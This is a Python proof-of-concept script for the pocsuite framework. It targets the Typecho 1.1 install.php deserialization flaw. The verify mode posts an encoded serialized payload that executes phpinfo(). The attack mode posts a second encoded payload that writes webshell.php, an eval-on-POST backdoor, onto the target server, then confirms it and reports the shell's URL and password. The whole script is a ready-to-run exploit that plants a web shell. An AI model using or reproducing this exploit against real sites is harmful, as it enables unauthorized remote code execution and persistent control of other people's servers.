#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
Copyright (c) 2014-2015 pocsuite developers (http://seebug.org)
See the file 'docs/COPYING' for copying permission
"""
#命令行
from pocsuite import pocsuite_cli
#验证模块
from pocsuite import pocsuite_verify
#攻击模块
from pocsuite import pocsuite_attack
#控制台模式
from pocsuite import pocsuite_console
from pocsuite.api.request import req 
from pocsuite.api.poc import register
from pocsuite.api.poc import Output, POCBase


class TypechoPOC(POCBase):
    vulID = '16'  # ssvid ID 如果是提交漏洞的同时提交 PoC,则写成 0
    version = '1' #默认为1
    vulDate = '2017-11-14' #漏洞公开的时间,不知道就写今天

    author = 'js2012' #  PoC作者的大名
    createDate = '2017-11-14'# 编写 PoC 的日期
    updateDate = '2017-11-14'# PoC 更新的时间,默认和编写时间一样
    references = 'http://www.freebuf.com/vuls/152058.html','https://www.t00ls.net/thread-42634-1-1.html','http://p0sec.net/index.php/archives/114/'# 漏洞地址来源,0day不用写
    name = 'Typecho install.php Unserialize'# PoC 名称
    appPowerLink = 'http://typecho.org/'# 漏洞厂商主页地址
    appName = 'typecho'# 漏洞应用名称
    appVersion = 'Typecho 1.1'# 漏洞影响版本
    vulType = 'cmd-exec'#漏洞类型,类型参考见 漏洞类型规范表
    desc = '''
        Typecho install.php反序列化漏洞
    ''' # 漏洞简要描述
    samples = ['https://github.com/typecho/typecho/releases/tag/v1.1-15.5.12-beta',]# 测试样列,就是用 PoC 测试成功的网站
    install_requires = [] # PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写
    cvss = u"严重" #严重,高危,中危,低危

    #验证漏洞 pocsuite -r 16-Typecho install.php-unserialize.py -u 127.0.0.5 --verify
    def _verify(self):
        result ={}
        payload =  "YToyOntzOjc6ImFkYXB0ZXIiO086MTI6IlR5cGVjaG9fRmVlZCI6Mjp7czoxOToiAFR5cGVjaG9fRmVlZABfdHlwZSI7czo3OiJSU1MgMi4wIjtzOjIwOiIAVHlwZWNob19GZWVkAF9pdGVtcyI7YToxOntpOjA7YTo1OntzOjU6InRpdGxlIjtzOjE6IjEiO3M6NDoibGluayI7czoxOiIxIjtzOjQ6ImRhdGUiO2k6MTUwODg5NTEzMjtzOjg6ImNhdGVnb3J5IjthOjE6e2k6MDtPOjE1OiJUeXBlY2hvX1JlcXVlc3QiOjI6e3M6MjQ6IgBUeXBlY2hvX1JlcXVlc3QAX3BhcmFtcyI7YToxOntzOjEwOiJzY3JlZW5OYW1lIjtzOjk6InBocGluZm8oKSI7fXM6MjQ6IgBUeXBlY2hvX1JlcXVlc3QAX2ZpbHRlciI7YToxOntpOjA7czo2OiJhc3NlcnQiO319fXM6NjoiYXV0aG9yIjtPOjE1OiJUeXBlY2hvX1JlcXVlc3QiOjI6e3M6MjQ6IgBUeXBlY2hvX1JlcXVlc3QAX3BhcmFtcyI7YToxOntzOjEwOiJzY3JlZW5OYW1lIjtzOjk6InBocGluZm8oKSI7fXM6MjQ6IgBUeXBlY2hvX1JlcXVlc3QAX2ZpbHRlciI7YToxOntpOjA7czo2OiJhc3NlcnQiO319fX19czo2OiJwcmVmaXgiO3M6ODoidHlwZWNob18iO30="
        vul_url = self.url+"/install.php?finish=a"
        header = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:56.0) Gecko/20100101 Firefox/56.0",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Accept-Language": "zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3",
                "Content-Type": "application/x-www-form-urlencoded",
                "Content-Length": 773,
                "Referer": self.url,
                "Connection": "close",
                "Upgrade-Insecure-Requests": 1
        }
        data = {
             "__typecho_config":payload
        }
        res = req.post(vul_url,headers=header,data=data)
        if "phpinfo()" in res.content:
            result['ShellInfo'] = {}
            result['ShellInfo']['URL'] = vul_url
            result['ShellInfo']['payload'] = payload
        print '[+]16 poc done'
        return self.save_output(result)
    #漏洞攻击 pocsuite -r 15-tomcat-CVE201712617.py -u 1.1.1.1 --attack
    def _attack(self):
        #定义返回结果
        result = {}
        header = {
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Accept-Encoding": "gzip, deflate",
                "Accept-Language": "zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:56.0) Gecko/20100101 Firefox/56.0",
                "Referer": self.url
        }
        payload = "YToyOntzOjc6ImFkYXB0ZXIiO086MTI6IlR5cGVjaG9fRmVlZCI6NDp7czoxOToiAFR5cGVjaG9fRmVlZABfdHlwZSI7czo4OiJBVE9NIDEuMCI7czoyMjoiAFR5cGVjaG9fRmVlZABfY2hhcnNldCI7czo1OiJVVEYtOCI7czoxOToiAFR5cGVjaG9fRmVlZABfbGFuZyI7czoyOiJ6aCI7czoyMDoiAFR5cGVjaG9fRmVlZABfaXRlbXMiO2E6MTp7aTowO2E6MTp7czo2OiJhdXRob3IiO086MTU6IlR5cGVjaG9fUmVxdWVzdCI6Mjp7czoyNDoiAFR5cGVjaG9fUmVxdWVzdABfcGFyYW1zIjthOjE6e3M6MTA6InNjcmVlbk5hbWUiO3M6NjM6ImZpbGVfcHV0X2NvbnRlbnRzKCd3ZWJzaGVsbC5waHAnLCAnPD9waHAgQGV2YWwoJF9QT1NUW3AwXSk7Pz4nKSI7fXM6MjQ6IgBUeXBlY2hvX1JlcXVlc3QAX2ZpbHRlciI7YToxOntpOjA7czo2OiJhc3NlcnQiO319fX19czo2OiJwcmVmaXgiO3M6NzoidHlwZWNobyI7fQ=="
        data = {
            "__typecho_config":payload
        }
        #获取漏洞url
        vul_url = '%s' % self.url
        #获取处理后的url
        vul_url = self.url+"/install.php?finish=a"
        res = req.post(vul_url,headers=header,data=data)
        status = req.get(self.url+"/webshell.php").status_code
        if status == 200:
            result['VerifyInfo']={}
            result['VerifyInfo']['URL']=self.url+"/webshell.php"+"--->Password:P0"
            result['VerifyInfo']['Payload']=data
            return self.save_output(result)
    def save_output(self, result):
        #判断有无结果并输出
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail()
        return output

register(TypechoPOC)

